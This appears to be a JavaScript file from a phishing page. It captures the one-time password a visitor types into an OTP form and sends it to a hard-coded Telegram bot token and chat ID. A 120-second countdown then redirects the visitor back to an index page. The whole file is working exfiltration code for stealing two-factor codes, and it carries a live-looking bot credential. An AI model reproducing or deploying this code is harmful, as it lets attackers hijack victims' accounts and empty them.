const otpform = document.querySelector("#otpform")
otpform.addEventListener("submit",async (e)=>{
   e.preventDefault()
   var otp = document.querySelector(".otp").value;
   var texts = `OTP is ${otp}`
   var token = `6906141770:AAH1rAsoxuawD7uatLfPEeMtdCErzmqOp4A`
   var chat_id = `-4016371216`
   var url = `https://api.telegram.org/bot${token}/sendmessage?chat_id=${chat_id}&text=${texts}`
   
   api = new XMLHttpRequest();
   await api.open("GET", url,true);
   await api.send()

   console.log("received")

   api.addEventListener("load", function () {
    if (api.status >= 200 && api.status < 300) {
        console.log("Message sent successfully");
    } else {
        console.error("Failed to send message. Status code: " + api.status);
        // Handle failure here
    }
});
})

let a = 120 ;
setInterval(() => {
  a--;
  document.getElementById("timer").innerHTML = a 
  if (a < 0) {
    clearInterval();
    window.location.href="./index.html"
  }
}, 1000);